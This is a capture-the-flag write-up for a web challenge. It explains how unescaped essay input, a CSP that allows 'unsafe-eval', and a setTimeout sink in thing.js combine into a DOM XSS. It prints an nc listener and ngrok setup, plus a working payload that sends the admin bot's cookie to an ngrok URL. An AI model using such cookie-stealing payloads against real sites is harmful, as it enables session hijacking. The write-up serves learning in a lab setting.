# Code-review and Vuln

In `main.py`, CSP is returning in response header from add_resp_headers() function.

and it running `/review/essay` endpoint. so, in `main.py`, we can see the our inputed data  in `/register` go to `bot.py` or admin bot. in `bot.py`, we can see that admin will go to `/review/essay` and check our inputed string. so, we can clearly see that we have to stole the cookie from admin browser to go to `/join`, got the flag. But not so easy though.

First, what type of xss is possible? Well, DOM-XSS can happen in `essay` path. (**not in email**). Why? cause in `essay_checker.html`, we can see the in `essay` path, he used `eassy|safe`. if you familar with safe, you can know that safe is used to return the user-input as a string (**i guess it can prevent the reflected-xss**) [what-is-Safe-in-djangos](https://stackoverflow.com/questions/4056883/when-should-i-use-escape-and-safe-in-djangos-template-system)

But, `safe` can't protect DOM-XSS, but problem is that CSP. let analytics the CSP with google csp auditor. When we paste the CSP script, audior show that this CSP is not safe and can leads to DOM-based xss. Cause of `script-src 'self' 'unsafe-eval'`

```
'unsafe-eval' allows the execution of code injected into DOM APIs such as eval().
```

So, We know now that we can do DOM-xss, but not fully.(**not freely**). To perform the DOM-based-xss in this site by passing the csp, we need to call a DOM-API for our xss (**script**). 

Luckily, there is one js file `/static/js/thing.js` that use the DOM-API. (**DOMContentLoaded**) -> `Our input will be fully loaded as HTML in browser`. Also, do you notice something in it? well, if know js properly you will. Cause he just write a waste of line in file, actually he can `console.log(iloveumass)`. but he used `setTimeOut()` sink. this function can leads to js injection if user can conrtoll it. And, We can controll it by xss by bypassing the csp.

# Plan
So, we can Steal admin's cookie by DOM-XSS and go to `/join` by the leaked admin's cookie. and we can get flag. 

i setup ngrok and listener:
```
./ngrok http 9999
nc -lnvp 9999
```

# Payload:
```
<script id='debuger' src="/static/js/thing.js" data-iloveumass="something');document.location.href=`http://6122-210-14-97-178.ngrok.io/?cookie=`%2bdocument.cookie;//"></script>
```


What this payload do is we closed the `console.log` function from `thing.js` with `');` (**single quote and open-bracket**) first and then call the `id` and `src` with same from `register.html`(**but remember that our xss is excuted on eassy_checker.html `/review/essay`**)

Then, we set the `document.location.href` property to send the `document.cookie` object from the admin browser to our ngrok (**web-hook**) server. Then we have to set the `//` behind the payload to make the everything comment in the line behind of it. (**So, our payload can excute properly**). 

So, Submit it on essay path in `/register` and wait 3 seconds and auth cookie have arrived to our ngrok server.

# Takeaway
If you are doing xss on site, pay attention to all js files of it and also console is your friend.

`syntax` is really weird and browser is strange all time :)

# Resources
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#dom-vulnerabilities

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss#sinks-2

# Thanks
Thank to CTF organizer and author of this chall. really cool and give a lot of knowledge.


